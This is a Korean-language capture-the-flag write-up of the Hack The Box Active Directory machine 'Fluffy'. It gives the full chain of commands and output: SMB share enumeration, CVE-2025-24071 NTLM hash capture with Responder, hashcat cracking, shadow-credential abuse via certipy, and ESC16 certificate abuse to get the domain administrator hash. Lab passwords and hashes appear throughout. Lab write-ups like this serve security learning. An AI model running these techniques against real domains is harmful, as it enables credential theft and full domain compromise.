# HTB-FLUFFY
```bash
OS: Windows(AD)
DATE: 26.11.11
DIFFICULTY: Easy
```

## RECON
초기 정찰을 하기 전 기본 크레덴셜을 얻고 시작하였다. `j.fleischman / J0elTHEM4n1990!` 이후 nmap을 통해 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49696,49709,49722 IP | tee nmap
```
검사 결과 88, 389 등이 있는 것으로 보아 AD의 DC 서버인 것 같았다. 이후 nxc를 사용하여 초기 유저가 어떤 공유 폴더를 사용할 수 있는지 확인해 보았다.
```bash
nxc smb IP -u j.fleischman -p 'J0elTHEM4n1990!' --shares

SMB         10.129.232.88   445    DC01             Share           Permissions            Remark
SMB         10.129.232.88   445    DC01             -----           -----------            ------
SMB         10.129.232.88   445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.232.88   445    DC01             C$                                     Default share
SMB         10.129.232.88   445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE             
SMB         10.129.232.88   445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ                   Logon server share
```
확인 결과 IT라는 공유 폴더에 쓰기 권한과 읽기 권한이 있다는 것을 알 수 있었다. 이후 bloodhound를 작동시키고 json 파일들을 모아보았다.
```bash
bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -ns IP -c all
```
이후 접속하여 확인해 본 결과 별다른 Outbound는 확인하지 못하였다.

## Initial Access
이제 아까 발견했던 smb IT 폴더에 접속해 보았다.
```bash
smbclient //IP/IT -U j.fleischman

smb > ls
  .                                   D        0  Wed Nov 11 23:31:31 2026
  ..                                  D        0  Wed Nov 11 23:31:31 2026
  Everything-1.4.1.1026.x64           D        0  Sat Apr 19 00:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Sat Apr 19 00:04:05 2025
  KeePass-2.58                        D        0  Sat Apr 19 00:08:38 2025
  KeePass-2.58.zip                    A  3225346  Sat Apr 19 00:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 23:31:07 2025
```
확인 결과 여러 프로그램의 zip 파일들과 pdf 파일이 있었다. 먼저 pdf 파일을 다운로드 받고 확인해 보았다.
```bash
smb > get Upgrade_Notice.pdf
```
```bash
open Upgrade_Notice.pdf
```

![pdf](attach_real/Pasted%20image%2020261112010926.png)

확인 결과 6개의 취약점이 대상 시스템에 나와 조치해야 한다는 보고서 같았다. 따라서 대상 보고서에 나온 취약점들을 조사해 보았다. 먼저 `CVE-2025-24996` 취약점은, Windows NTLM에서 파일 이름 또는 경로에 대한 외부 제어로 인해 권한이 없는 공격자가 네트워크를 통해 스푸핑을 수행할 수 있도록 하는 취약점이었다. 지금 당장은 사용할 수 없을 것 같아 다음 취약점인 **CVE-2025-24071** 취약점을 찾아보았다. 대상 취약점은 PoC로 악성 .library-ms를 생성하고 공유 폴더에 업로드한 후, 공격자 측에서 NTLM 해시를 얻을 수 있는 취약점이었다. 나는 IT 공유 폴더에 쓰기 권한이 있기에 대상 취약점을 이용해 보기로 했다. 따라서 먼저 [PoC](https://github.com/ThemeHackers/CVE-2025-24071/blob/main/exploit.py)를 다운로드 받고 exploit을 진행하였다.
```bash
python3 poc.py

Enter your file name: root
Enter IP (EX: 192.168.1.162): IP
completed
```
이렇게 하여 exploit.zip을 생성해 주고, 이것을 업로드해 주었다.
```bash
smbclient //fluffy.htb/IT -U j.fleischman%J0elTHEM4n1990!

smb > put exploit.zip
smb > ls
```
```bash
sudo responder tun0

[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:d4a967c70e2ea3b1:69A11F5D2585400E6F67C6E8E9C4FCAD:0101000000000000
```
그 결과 p.agila 유저의 NTLM 해시를 얻게 되었다. 따라서 이 해시를 hashcat mode 5600을 이용하여 크랙해 주었다.
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
그 결과 `p.agila` 유저의 평문 비밀번호를 얻을 수 있었다. 이제 다시 한번 대상 유저를 bloodhound에서 확인해 보았다.

![blood](attach_real/Pasted%20image%2020261112013218.png)

확인 결과 `SERVICE ACCOUNTS` 그룹과 GenericAll 관계라는 것을 알게 되었다. 따라서 대상 유저를 대상 그룹에 추가해 주었다.
```bash
net rpc group addmem "SERVICE ACCOUNTS" "P.AGILA" -U "fluffy.htb"/"P.AGILA"%"prometheusx-303" -S "DC01.fluffy.htb"
```
```bash
net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb"/"P.AGILA"%"prometheusx-303" -S "DC01.fluffy.htb"

p.agila
```
확인 결과 잘 들어갔다. 이제 대상 그룹의 outbound를 확인해 보았다.

![blood2](attach_real/Pasted%20image%2020261112013555.png)

확인 결과 여러 서비스 계정이 GenericWrite 관계로 엮여 있었다. 따라서 먼저 winrm 계정을 노려보았다. 대상 관계는 certipy-ad의 shadow auto 기능으로 악용할 수 있기에 시도해 보았다.
```bash
certipy-ad shadow auto -u 'P.AGILA@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc' -dc-ip 10.129.232.88 -dc-host 'DC01.fluffy.htb'

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a83a59dd32ce4ecaa95c17b3eb506f2c'
[*] Adding Key Credential with device ID 'a83a59dd32ce4ecaa95c17b3eb506f2c' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'a83a59dd32ce4ecaa95c17b3eb506f2c' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```
그 결과 winrm_svc의 NT hash를 얻을 수 있었다. 이제 대상 유저의 쉘로 들어가 user 플래그를 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261112015314.png)

## Privilege Escalation
이제 winrm_svc 계정의 NT 해시를 얻었던 방법과 마찬가지로 CA_SVC 계정의 NT 해시도 얻어 주었다.
```bash
certipy-ad shadow auto -u 'P.AGILA@fluffy.htb' -p 'prometheusx-303' -account 'CA_SVC' -dc-ip 10.129.232.88 -dc-host 'DC01.fluffy.htb'

[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```
이제 CA 계정을 얻어 주었으니 certipy-ad의 find 기능을 이용하여 취약한 CA 설정이 있는지 확인해 주었다.
```bash
certipy-ad find -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -ns 10.129.232.88  -vulnerable -stdout

    Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
확인 결과 대상 CA는 ESC16이라는 취약점을 가지고 있었다. 따라서 [Exploit Tutorial](https://plaintext.do/en/blog/esc16-escalacion-privilegios-windows/)을 검색하여 exploit을 진행하였다. 먼저 UPN을 admin으로 변경하는 작업을 진행하였다.
```bash
certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'DC01.fluffy.htb' -upn 'administrator' -user 'ca_svc' update
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
진행 결과 성공하였다. 따라서 다음으로 새로운 UPN으로 인증서를 요청하는 작업을 하였다.
```bash
certipy-ad req -dc-ip '10.129.232.88' -ns 10.129.232.88 -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
```
그 결과 administrator.pfx를 얻을 수 있었다. 이제 UPN 변경 사항을 되돌려 주었다.
```bash
certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'DC01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```
이제 되돌렸으니 admin의 NT 해시를 추출해 보았다.
```bash
 certipy-ad auth -dc-ip '10.129.232.88' -pfx administrator.pfx -username 'Administrator' -domain 'fluffy.htb'                    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): 
[*] Wrote credential cache to 'administrator_f1ae10ce-64a6-4406-824b-4db9eeffe03f.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
이로써 도메인 admin의 NT 해시를 얻게 되었다. 이제 쉘에 접속하여 root 플래그를 얻게 되었다.

![root](attach_real/Pasted%20image%2020261112000811.png)

## New Inform
- 취약점을 알려주면 그게 뭔지 진득하게 찾아보자. PoC만 찾지 말고
- `CVE-2025-24071` 대상 취약점은 Windows 탐색기가 .library-ms 파일을 압축 해제 시 자동 파싱하며 외부 UNC로 SMB 인증을 시도하는 결함으로, 공격자가 피해자의 NTLMv2 해시를 비대화형으로 탈취해 초기 도메인 크리덴셜을 확보할 수 있다.
- GenericWrite는 비밀번호를 직접 못 바꾸지만(그건 GenericAll/Reset Password), msDS-KeyCredentialLink라는 속성을 쓸 수 있다는 게 결정타다. 이 속성 하나로 비밀번호를 모르고도, 바꾸지도 않고 그 계정으로 인증할 수 있게 됨
- AD 툴에서 /etc/hosts가 세팅되어 있으면 ns 옵션을 굳이 주지 않아도 됨
- 뭔가 안 되면 ns 옵션을 뺐다 꼈다 해보자
- domain과 target을 잘 구분하자